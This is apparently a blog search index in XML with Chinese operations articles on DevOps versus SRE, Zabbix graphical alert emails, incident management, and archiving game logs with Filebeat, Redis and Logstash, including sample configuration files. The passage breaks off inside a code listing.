<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[一篇文章彻底读懂DevOps与SRE来龙去脉(译)?]]></title>
      <url>/2018/08/01/devops-sre.html</url>
      <content type="html"><![CDATA[<p><img src="http://ow1schdt5.bkt.clouddn.com/ds/devsre.jpg" alt="image"></p>
<ul>
<li>若是把运维当作一门学科来看，是有难度的.不仅因为如何很好的运行系统这种普遍问题未得到解决外，现存的最佳实战也因高度依赖环境，而未得到广泛使用；另外一个未解决的问题就是如何更好的管理运维团队。详细分析这些问题通常被认为起源于致力运筹学的研究，在第二次世界大战期间用于改善盟军的进程和产出，但事实上，几千年来，我们一直在思考如何更好的运营</li>
<li>然而，尽管有这么多的努力和想法，可靠的生产运维仍然难以保障,特别是在信息技术和软件可操作性领域<br> 例如:以企业的角度,通常将运维视为成本中心;如果可能，要做有意义的改进即使是困难的.因对这种方法的短视，尚未得到广泛理解，但是对它的不满已经引发了如何组织我们在IT中所有事情的一场革命，这场革命源于试图解决一系列共同问题，最新解决这些问题的方案有两个:DevOps和SRE(Site Reli‐ability Engineering)。事实上，它们有很多相似之处，要比我们想象的多</li>
</ul>
<h4 id="DevOps产生的背景"><a href="#DevOps产生的背景" class="headerlink" title="DevOps产生的背景"></a>DevOps产生的背景</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/ds/doq.png" alt="image"></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/ds/do.png" alt="image"></p>
<p>DevOps是一套松散的实践、指南和文化，旨在打破IT开发、运维、网络和安全方面的孤岛。由JohnWillis，Damon Edwards和Jez Humble联合执笔，阐述:CA(L)MS-代表文化、自动化、精益(如精益管理，持续交付)、度量、分享，是DevOps关键思想的缩写。分享和协作是这场运动的最前线,在DevOps方法中,改进(通常通过自动化方式)、然后度量结果，并与同事分享这些成果，这样整个组织都可以得到改进。所有CALMS原则都是有这种支持性文化促成的<br>DevOps、敏捷以及各种其他商业和软件工程技术都是关于如何在现代商业中最好的做生意的普遍世界观的例子。DevOps思想中的任何元素都不容易彼此分离，这基本上是通过设计来实现的。然而，一些关键的想法可以相对独立的进行讨论</p>
<h5 id="不再孤岛-谷仓效应"><a href="#不再孤岛-谷仓效应" class="headerlink" title="不再孤岛(谷仓效应)"></a>不再孤岛(<a href="http://dwz.cn/jSFrvxly" target="_blank" rel="external">谷仓效应</a>)</h5><p>第一个关键思想:不再有孤岛，针对这一思想有两个方面的反应:</p>
<ul>
<li>历史上流行但现在越来越老式的独立运维和开发团队</li>
<li>事实上，知识的极端孤立,对纯粹的局部优化的激励，以及缺乏协作在很多情况下对于企业来说都是非常糟糕的</li>
</ul>
<h5 id="事故是正常的"><a href="#事故是正常的" class="headerlink" title="事故是正常的"></a>事故是正常的</h5><p>第二个关键思想: 事故不仅仅是个人孤立行为的结果,而是因为当事情不可避免地出错时缺少保障措施。例如:一个糟糕的界面在压力环境下会促使采取错误操作。如果发生(未明确的)错误情况,系统错误会使失败不可避免;坏的监控使我们无法知道是有问题，更不用说出了什么问题。一切传统观念的企业具有根除犯错制造者和处罚他们的文化本能，但这样做有其自身的后果:最明显的是，它们创造了是问题混淆、掩盖真相、责怪他人的动机，所有这些最终都是无益的分心行为。因此，着眼于加速恢复故障比预防事故更有意义</p>
<h5 id="变更应该循序渐进"><a href="#变更应该循序渐进" class="headerlink" title="变更应该循序渐进"></a>变更应该循序渐进</h5><p>第三个关键思想: 小而频繁的变更时最佳的。在变更委员会每月开会讨论彻底修改大型机配置的计划,这是一个激进的做法。然而这种做法并不鲜见，所有变更必须由经验丰富的人员考虑并且为了有效考虑而进行批量化的观点，结果或多或少与最佳实践相悖。变更是有风险的，没错，但是正确的做法是将变更尽可能拆分成晓得组件或单元。然后，根据产品、设计和基础设施的变更，建立一个稳定的低风险变更管道。这种策略，增加对小变更的自动化测试和可靠地回滚有问题的变更，就形成了变更管理的方法:持续集成(CI)和持续交付或部署(CD)</p>
<h5 id="工具和文化是相互关联的"><a href="#工具和文化是相互关联的" class="headerlink" title="工具和文化是相互关联的"></a>工具和文化是相互关联的</h5><p>工具和文化是DevOps的重要组成部分,特别是在强调正确管理变更的今天，变更管理依赖于高度特定的工具。然而，DevOps支持者强烈强调组织文化而不是工具本身，作为新工作方式成功的关键。一个好的文化可以解决围绕破碎的工具工作，但相反的情况很少适用。俗话说的好，文化将策略当早餐吃了(意味着文化的影响力远胜过策略)，像运维，改变其自身是很难的事</p>
<h5 id="度量至关重要"><a href="#度量至关重要" class="headerlink" title="度量至关重要"></a>度量至关重要</h5><p>最后，度量在总体业务环节中尤其重要，例如打破孤岛和事件解决方案。在每个环境中，通过客观的测量来确定正在发生的事情的真实性，验证是否按预期进行了改变。并为不同职能部门达成一致建立客观基础(适用于业务和其他环境，例如on-call)</p>
<h4 id="SRE产生的背景"><a href="#SRE产生的背景" class="headerlink" title="SRE产生的背景"></a>SRE产生的背景</h4><p>网站可靠性工程师(SRE)是Google工程副总裁BenTreynor Sloss创建的术语(和相关的工作角色)。正如我们在前一节中所讲，DevOps是关于运维和产品开发之间的全周期协作的一系列广泛原则。SRE是一个工作角色，一组实践。如果DevOps是一种哲学和一种工作方法，那么SRE实现了DevOps所描述的一些思想，而且更接近于工作或角色的定义，比如”DevOps工程师”。因此，从某种程度上来说，SRE是DevOps的实现。<br>与DevOps运动不同，DevOps运动起源于多家公司的领导者和实践者之间的合作产生的,在SRE广泛普及之前，Google的SRE继承了周围公司的大部分文化，并没有像DevOps一样突出文化的变化</p>
<h4 id="SRE有以下具体原则"><a href="#SRE有以下具体原则" class="headerlink" title="SRE有以下具体原则"></a>SRE有以下具体原则</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/ds/sre.png" alt="image"></p>
<h5 id="运维是一个软件问题"><a href="#运维是一个软件问题" class="headerlink" title="运维是一个软件问题"></a>运维是一个软件问题</h5><p>SRE的基本原则是做好运维是一个软件问题。因此，SRE应该使用软件工程思想来解决该问题。这是一个广泛的领域，包括从流程和业务变化到类似复杂但更传统的软件问题，例如重写堆栈以消除业务逻辑中的单点故障。</p>
<h5 id="通过SLOs-服务质量目标-进行管理"><a href="#通过SLOs-服务质量目标-进行管理" class="headerlink" title="通过SLOs(服务质量目标)进行管理"></a>通过SLOs(服务质量目标)进行管理</h5><p>SRE不会试图提供100%的可用性，正如我们第一本书《Site Reliability Engineering》(网站可靠性工程)中所讨论的，这是个错误的目标，原因有很多。相反，产品团队和SRE团队为服务及其用户群选择适当的可用性目标，并将服务管理到该SLO。决定这样的目标需要业务部门强有力的合作。SLOs也有文化内涵:作为利益相关者之间的协作决定，SLO违规行为将团队无可指责的重新回到绘图板。</p>
<h5 id="减少琐事"><a href="#减少琐事" class="headerlink" title="减少琐事"></a>减少琐事</h5><p>对于SRE来说，任何手动、重复性的的运维任务都是让人厌恶的。我们相信，如果一台机器可以执行期望的运维操作，我们就应该经常这样做。这种差别和价值在其他组织中并不常见，一些琐事就需要人力才能完成。对于在Google的SRE来说，琐事并不能作为工作来做。任何花费在操作任务上的时间意味着我们并没有真正的在为项目工作——我们如何使服务更可靠和可伸缩<br>a<br>然而，”生产智慧”为我们执行运维任务提供了非常重要的帮助。这种工作，可以通过指定系统的实时反馈来落地。需要甄别琐事的来源以便可以最小化这些工作甚至消除。但是，如果发现自己操作状态不佳，则可能需要更频繁的推送新功能和变更，以便其他工程师熟悉你所支持的服务</p>
<ul>
<li>生产智慧<br>关于”生产智慧”阐释: 使用这个词，意思是我们从运行的生产环境中获取到的智慧——关于它实际上是如何工作的、软件应该如何设计的细节而不是与实际相孤立的服务。获得所有事件及团队获工单等等都与现实直接相关，可以更好为系统设计和行为提供信息</li>
</ul>
<h5 id="工作自动化"><a href="#工作自动化" class="headerlink" title="工作自动化"></a>工作自动化</h5><p>这个领域的真正工作是决定什么条件下做什么自动化以及怎么自动化。<br>SRE在Google实践中:团队成员花费在琐事上而不是产生持久价值工程的时间为限制在50%。许多人把这个认为限制的上限。实际上,针对采用工程方法来解决问题，视为一种明确的声明和机制，要比一遍一遍的做琐事更加有用的多。</p>
<p>当我们考虑自动化和琐事时，基线和其如何发挥作用并不直观。随着时间的推移，一个SRE团队会将所有可以自动化的服务都自动化，剩下的都是无法实现自动化的(Murphy-Beyer效应)。这将主导SRE团队的工作，除非有其他要做。在Google环境中，你倾向添加更多的服务，直到达到某些限制，仍然有50%工程时间，或者你在自动化方面非常成功你可以去做一些其他完全不同的事情</p>
<h5 id="通过降低失败成本来快速流转"><a href="#通过降低失败成本来快速流转" class="headerlink" title="通过降低失败成本来快速流转"></a>通过降低失败成本来快速流转</h5><p>SRE的主要优点之一就是不一定要提高可靠性,即使它已经发生,但实际上改进了产品开发的产出。为什么？降低常见故障的平均故障时间(MTTR)会增加产品开发人员的迭代速度，因为工程师不用将精力过多分散在处理故障问题上。这源于一个众所周知的事实，即在产品生命周期的后期，一个问题被修复的代价越高。SREs专门负责改善处理产品后期出现的问题，为整个公司带来收益。</p>
<h5 id="与开发人员分享所有权"><a href="#与开发人员分享所有权" class="headerlink" title="与开发人员分享所有权"></a>与开发人员分享所有权</h5><p>“应用程序开发”和”生产”之间的严格界限(有时被称为Dev和Ops)会产生相反的效果。将责任分工、运维分类作为成本中心，则会导致权力失衡或薪酬差异这一点尤为正确</p>
<p>SREs倾向于关注生产问题而不是业务逻辑问题，但是随着他们用软件工程工具的方法来解决问题以及与产品开发团队分享技能。一般而言，SRE在他们关注的服务可用性、延迟、性能、效率、变更管理、监控、紧急响应和容量规划方面具有特殊的专业知识。这些特殊技能(通常明确定义的)是SRE为产品和开发团队技术服务的基础。理想情况下，产品开发和SRE团队对技术栈有一个整体的了解——前端、后端、库、存储、内核和物理机——任何团队都不应该嫉妒拥有单一组件</p>
<p>在《Site Reliability Engineering》(网站可靠性工程)一书中，我们并没有明确指出：在Google，产品开发团队就默认拥有他们的服务，虽然SRE原则仍然告知整个Google如何管理服务，但是SRE原则既不可用也不保证。SRE团队的所有权模式与产品开发团队合作最终也是一个共享模型</p>
<h5 id="使用相同的工具，无论功能或职位"><a href="#使用相同的工具，无论功能或职位" class="headerlink" title="使用相同的工具，无论功能或职位"></a>使用相同的工具，无论功能或职位</h5><p>工具是一个非常重要的行为决定因素。在Google的环境中，SRE如果没有统一的代码库、软件和系统的各种工具、高度优化和专有的生产堆栈等是非常天真的。我们与DevOps分享这个绝对假设:负责服务的团队应该使用相同的服务工具，不管它们在组织中的角色是什么。如果没有好的方法去管理服务,一个工具给SREs使用，另外一个工具给产品开发者使用，在不同的情况下，操作不同，可能会是灾难性的。彼此分歧越多，公司从改进每个工具的努力中获益就越少</p>
<h4 id="DevOps与SRE对比"><a href="#DevOps与SRE对比" class="headerlink" title="DevOps与SRE对比"></a>DevOps与SRE对比</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/DevOps-vs-SRE.png" alt="image"></p>
<p>从上面聊的原则中，我们可以看到它们之间有很多共性:</p>
<ul>
<li>DevOps和SRE都取决于为了持续改进，必须接受变化</li>
<li>协作是DevOps工作的前沿和中心，有效共享所有权模式和合作伙伴关系是SRE发挥作用的必要条件。与DevOps一样，SRE也具有跨组织共享的强大价值，这样更容易打破团队之间的壁垒</li>
<li>变更的最佳实践是: 持续小而频繁的变更，大部分情况下，都需要自动化测试和应用。关键是变更对可用性影响对于SRE来说尤为重要</li>
<li>使用正确的工具至关重要，工具在一定程度上决定了行动范围。然而，我们不能过于关注使用某种特定工具来实现一些操作。面向系统管理的API是一个更重要方法</li>
<li>度量对于DevOps和SRE来说都至关重要。对于SRE来说，SLOs(服务质量目标)决定着是否改善优化服务。当然，如果没有衡量标准(以及在产品、基础设施/SRE和业务之间的跨团队合作)，就不会有SLO。对于DevOps来说，度量行为常用来了解过程的产出、一个反馈周期持续的时间等等。无论从专业角度还是从哲学角度，DevOps和SRE都是面向数据的</li>
<li>管理生产服务器残酷的事实就是偶尔发发生了故障，并且你要说出为什么。SRE和DevOps都是无可指责的，目的是为了消除无意义的争论</li>
<li>最终，实施DevOps或SRE是一种整体行为，两者都希望使用一种特定的工作方式共同协作，促使整个团队运营的更好。对于DevOps和SRE来说,更好的速度就是产出。</li>
</ul>
<p>正如你说看到的，DevOps和SRE有很多共同点。然而，也存在着显著的差异，DevOps在某种意义上是一种更广泛的哲学和文化。DevOps对于如何在一个具体层面上运行相对沉默，例如，它并没有明确规定如何对服务进行精细化管理，而更多的专注如何打破更广泛的组织中的障碍。这就很有价值。</p>
<p>另一方面，SRE的指责范围相对狭窄，其职权范围通常是面向服务的(以终端用户为导向),而非整体业务。因此，它解决如何高效运行系统有自己的知识框架(包括错误预算等概念)。尽管SRE作为一种职业，高度关注激励错误和效率，但在诸如“组织孤岛”和“信息壁垒”等话题上，却相对沉默。它将支持CI/CD，不一定是因为业务需要，而是改进操作的实践。或者，换句话说，SRE相信和DevOps相同的东西，但原因可能有所不同</p>
<blockquote>
<p>译自 <a href="http://ow1schdt5.bkt.clouddn.com/books/site-reliability-workbook.pdf" target="_blank" rel="external">How SRE Relates to DevOps(class SRE implements interface DevOps)</a></p>
</blockquote>
<p>欢迎关注“运维ABC”(AI、BigData、Cloud),运维技术社区,专注运维自动化、DevOps、AIOPS、ChatOPS、容器等落地与实践</p>
<p><div align="center"><img src="http://ow1schdt5.bkt.clouddn.com/qrcode.jpg" alt="image"></div></p>
]]></content>
      
        <categories>
            
            <category> 自动化运维 </category>
            
            <category> CI/CD </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DevOps,SRE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[兄台了解下：图文告警邮件?]]></title>
      <url>/2018/07/16/zbx-email-report.html</url>
      <content type="html"><![CDATA[<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>告警时将告警信息及当前一段时间趋势图发送邮件或word文档</p>
<h4 id="要领"><a href="#要领" class="headerlink" title="要领"></a>要领</h4><ol>
<li>增加Email报警介质</li>
<li>配置Zabbix Actions，并规范报警信息格式</li>
<li>获取告警信息</li>
<li>得到itemid，获取一段时间趋势图</li>
<li>配置发送邮箱</li>
<li>发送邮件：图文</li>
<li>在config.ini中定义生成报表的主机及graphid</li>
<li>执行脚本，生成word报表<h4 id="程序逻辑图"><a href="#程序逻辑图" class="headerlink" title="程序逻辑图"></a>程序逻辑图</h4><img src="http://ow1schdt5.bkt.clouddn.com/zbx/zbx-email.png" alt="image"><br>代码参考：<br><a href="https://github.com/geekwolf/sa-scripts/tree/master/ops-scripts/zabbix/zabbix_report_email" target="_blank" rel="external">zabbix_report_email</a></li>
</ol>
<h4 id="邮件图文报警"><a href="#邮件图文报警" class="headerlink" title="邮件图文报警"></a>邮件图文报警</h4><ol>
<li>配置Email报警介质</li>
</ol>
<p><code>注意:如果脚本不能正常运行，请检查权限</code><br><img src="http://ow1schdt5.bkt.clouddn.com/zbx/email.png" alt="image"></p>
<ol>
<li><p>配置Actions<br><code>注意:Default subject格式：{ITEM.ID}|Ploblem|{TRIGGER.NAME}</code><br><img src="http://ow1schdt5.bkt.clouddn.com/zbx/action.png" alt="image"></p>
</li>
<li><p>修改触发器，进行报警测试</p>
</li>
</ol>
<h4 id="报表"><a href="#报表" class="headerlink" title="报表"></a>报表</h4><ol>
<li>添加要报表的主机及graphid<br>修改config.ini中的info</li>
<li><p>生成报表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python report.py report</div></pre></td></tr></table></figure>
</li>
<li><p>说明</p>
</li>
</ol>
<p>报表功能比较简单，可以根据自身情况，修改代码，进行定制</p>
<h4 id="脚本打包二进制"><a href="#脚本打包二进制" class="headerlink" title="脚本打包二进制"></a>脚本打包二进制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">pip install pyinstaller</div><div class="line">pyinstaller -F report.py</div><div class="line">在当前目录会生成dist/report 二进制文件</div><div class="line">cp default.docx dist/default.docx</div><div class="line">cp config.ini dist/config.ini</div></pre></td></tr></table></figure>
<p>最后，拷贝dist下的文件就可以使用了，不需在安装依赖</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> zabbix,监控 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[运维故障管理的思考]]></title>
      <url>/2018/07/03/thinking-on-fms.html</url>
      <content type="html"><![CDATA[<h4 id="为什么要做故障管理"><a href="#为什么要做故障管理" class="headerlink" title="为什么要做故障管理"></a>为什么要做故障管理</h4><p>故障一般是指生产环境出现服务不可用、不稳定、服务性能降低等事件导致用户或玩家体验变差或功能不可用的问题;墨菲定律告诉我们:</p>
<ol>
<li>任何事都没有表面看起来那么简单</li>
<li>所有的事都会比你预计的时间长</li>
<li>会出错的事总会出错</li>
<li>如何你担心某种情况发生，那么它就更有可能发生</li>
</ol>
<p>无论故障发生的概率有多小，只要有出现的可能，它总会发生；同样海恩法则也警告我们：每一起严重事故的背后，必然有29次轻微事故和300次未遂先兆，以及1000个事故隐患，也就是说任何严重事故背后都是有很多次小问题的积累，当达到一定量级时就会导致质变，出现严重的问题；所以为了保证SLA，提前发现、准确定位、避免二次出现故障，解决责任界限不清晰，主导改进不明确等问题，甚至故障自愈，减少对项目的影响，我们需要一个规范可遵循的故障管理原则</p>
<h4 id="故障管理目标"><a href="#故障管理目标" class="headerlink" title="故障管理目标"></a>故障管理目标</h4><ul>
<li>减少故障，提升故障处理效率</li>
<li>增强线上产品稳定性，提升SLA</li>
<li>运维问题总结，作为知识库</li>
<li>完善故障问题的检测监控</li>
<li>为故障自愈提供依据</li>
</ul>
<h4 id="故障定级标准"><a href="#故障定级标准" class="headerlink" title="故障定级标准"></a>故障定级标准</h4><p>为了衡量影响范围及影响程度，与PM、产品、开发共同确定统一的判断标准，避免后期复盘故障出现推卸责任及无所谓的问题。故障等级一般会根据MTBF(平均故障间隔时间，越长表示可靠性越高)、MTTR(平均恢复时间，越短表示影响越小)、MTTF(平均失效时间，系统平均正常运行多长时间，发生一次故障;可靠性越高，平均无故障时间越长)等作为衡量标准。根据我们游戏运营情况，按照影响玩家数量及故障时间来进行故障的定级：</p>
<ul>
<li>S开头表示影响玩家的故障</li>
<li>T是指不影响玩家的故障</li>
<li>1、2、3严重程由大到小<br><img src="http://ow1schdt5.bkt.clouddn.com/fms/fms-table.png" alt="image"></li>
</ul>
<h4 id="故障管理流程"><a href="#故障管理流程" class="headerlink" title="故障管理流程"></a>故障管理流程</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/fms/warn.png" alt="image"></p>
<ol>
<li>通过玩家反馈、监控告警以及计划内变更(如停服版本更新等),确认故障后，通知项目质量保障群</li>
<li>运维初步了解判断故障现象、范围及原因，通知开发、DBA等是否介入</li>
<li>根据故障影响确认处理优先级</li>
<li>定位、处理故障</li>
<li>故障恢复后，若重大故障，开发、运维、DBA等分析复盘故障</li>
<li>改进方案、是否需要完善监控、应急措施</li>
<li>FMS故障管理系统记录故障：故障处理过程、改进措施等</li>
</ol>
<p><strong>故障分析报告模板：</strong></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/fms/example1.png" alt="image"></p>
<h4 id="故障自愈"><a href="#故障自愈" class="headerlink" title="故障自愈"></a>故障自愈</h4><p>针对未知故障，抽象检测脚本，在遇到二次故障告警时，通过Zabbix远程执行相关处理逻辑；可以参考蓝鲸的做法，将自愈作为套餐去消费</p>
<h4 id="FMS故障管理系统"><a href="#FMS故障管理系统" class="headerlink" title="FMS故障管理系统"></a>FMS故障管理系统</h4><h5 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h5><p>  根据上述故障管理思路，开发了FMS故障管理系统，功能点如下图：<br><img src="http://ow1schdt5.bkt.clouddn.com/fms/fms_arc.png" alt="image"></p>
<h5 id="裸照"><a href="#裸照" class="headerlink" title="裸照"></a>裸照</h5><p><img src="http://ow1schdt5.bkt.clouddn.com/fms/dashboard.jpg" alt="image"><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/fms.jpg" alt="image"><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/add_fms.jpg" alt="image"><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/add_user.jpg" alt="image"><br><img src="http://ow1schdt5.bkt.clouddn.com/fms/report.png" alt="image"></p>
<h5 id="FMS项目"><a href="#FMS项目" class="headerlink" title="FMS项目"></a>FMS项目</h5><p><a href="https://github.com/geekwolf/fms.git" target="_blank" rel="external">https://github.com/geekwolf/fms.git</a><br>有什么好的建议欢迎提issue~</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
            <category> 自动化运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> fms,自动化运维,DevOps </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Filebeat和Logstash集中归档游戏日志]]></title>
      <url>/2018/01/13/filebeat-redis-logstash.html</url>
      <content type="html"><![CDATA[<h4 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h4><p>由于游戏项目日志目前不够规范,不太容易根据字段结构化数据,开发又有实时查看生产和测试环境服务运行日志需求;如果写入ES通过Kibana查看,对于非分析类查看还是不太友好,当然也可以通过<a href="https://github.com/sivasamyk/logtrail" target="_blank" rel="external">LogTrail</a>插件</p>
<h4 id="方-案"><a href="#方-案" class="headerlink" title="方 案"></a>方 案</h4><ul>
<li>Filebeat-&gt;Logstash-&gt;Files</li>
<li>Filebeat-&gt;Redis-&gt;Logstash-&gt;Files</li>
<li>Nxlog(Rsyslog、Logstash)-&gt;Kafka-&gt;Flink(Logstash-&gt;ES-Kibana)</li>
<li>其他方案(可根据自己需求，选择合适的架构,作者选择了第二种方案)</li>
</ul>
<p><strong>注释:</strong> 由于Logstash无法处理输出到文件乱序的问题，可通过不同的文件使用不同的Logstash,单线程归档；或者直接写入ES(基于@timestamp)、通过Flink输出到文件</p>
<h4 id="部-署"><a href="#部-署" class="headerlink" title="部 署"></a>部 署</h4><h5 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h5><ul>
<li>Debian8 x64</li>
<li>logstash-6.1.1</li>
<li>filebeat-6.1.1-amd64</li>
<li>Redis-3.2</li>
</ul>
<h5 id="Filebeat配置"><a href="#Filebeat配置" class="headerlink" title="Filebeat配置"></a>Filebeat配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">/etc/filebeat/filebeat.yml</div><div class="line"></div><div class="line">filebeat.prospectors:</div><div class="line">- type: log</div><div class="line">  paths:</div><div class="line">    - /home/data/log/*</div><div class="line">    - /home/data/*.log</div><div class="line">  scan_frequency: 20s</div><div class="line">  encoding: utf-8</div><div class="line">  tail_files: true</div><div class="line">  harvester_buffer_size: 5485760</div><div class="line">fields:</div><div class="line">  ip_address: 192.168.2.2</div><div class="line">  env: qa</div><div class="line">output.redis:</div><div class="line">  hosts: [&quot;192.168.1.1:6379&quot;]</div><div class="line">  password: &quot;geekwolf&quot;</div><div class="line">  key: &quot;filebeat&quot;</div><div class="line">  db: 0</div><div class="line">  timeout: 5</div><div class="line">  max_retires: 3</div><div class="line">  worker: 2</div><div class="line">  bulk_max_size: 4096</div></pre></td></tr></table></figure>
<h5 id="Logstash配置"><a href="#Logstash配置" class="headerlink" title="Logstash配置"></a>Logstash配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">input &#123;</div><div class="line"> #Filebeat</div><div class="line"> # beats &#123;</div><div class="line"> #   port =&gt; 5044</div><div class="line"> # &#125;</div><div class="line"> #Redis</div><div class="line">  redis &#123;</div><div class="line">    batch_count =&gt; 4096</div><div class="line">    data_type =&gt; &quot;list&quot;</div><div class="line">    key =&gt; &quot;filebeat&quot;</div><div class="line">    host =&gt; &quot;127.0.0.1&quot;</div><div class="line">    port =&gt; 5044</div><div class="line">    password =&gt; &quot;geekwolf&quot;</div><div class="line">    db =&gt; 0</div><div class="line">    threads =&gt; 2</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line">filter &#123;</div><div class="line">  ruby &#123;</div><div class="line">      code =&gt; &apos;event.set(&quot;filename&quot;,event.get(&quot;source&quot;).split(&quot;/&quot;)[-1])&apos;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">output &#123;</div><div class="line"></div><div class="line">  if [filename] =~ &quot;nohup&quot; &#123;</div><div class="line">    file &#123;</div><div class="line">        path =&gt; &quot;/data/logs/%&#123;[fields][env]&#125;/%&#123;+YYYY-MM-dd&#125;/%&#123;[fields][ip_address]&#125;/%&#123;filename&#125;&quot;</div><div class="line">        flush_interval =&gt; 3</div><div class="line">        codec =&gt; line &#123; format =&gt; &quot;%&#123;message&#125;&quot;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125; else &#123;</div><div class="line">    file &#123;</div><div class="line">         path =&gt; &quot;/data/logs/%&#123;[fields][env]&#125;/%&#123;+YYYY-MM-dd&#125;/%&#123;[fields][ip_address]&#125;/logs/%&#123;filename&#125;&quot;</div><div class="line">        flush_interval =&gt; 3</div><div class="line">        codec =&gt; line &#123; format =&gt; &quot;%&#123;message&#125;&quot;&#125;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> #stdout &#123; codec =&gt; rubydebug &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="生产日志目录"><a href="#生产日志目录" class="headerlink" title="生产日志目录"></a>生产日志目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── prod</div><div class="line">│   └── 2018-01-13</div><div class="line">│       └── 2.2.2.2</div><div class="line">│           ├── logs</div><div class="line">│           │   ├── rpg_slow_db_.27075</div><div class="line">│           └── nohup_service.log</div><div class="line">└── qa</div><div class="line">    ├── 2018-01-12</div><div class="line">    │   ├── 192.168.3.1</div><div class="line">    └── 2018-01-13</div><div class="line">        ├── 192.168.3.2</div></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>笔者在测试Logstash单线程输出时，依然产生乱序问题(有知晓的可以留言),最终选择通过自己开发的daemon程序实现,参考<a href="https://github.com/geekwolf/sa-scripts/blob/master/ops-scripts/plogstash" target="_blank" rel="external">Plogstash</a>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div 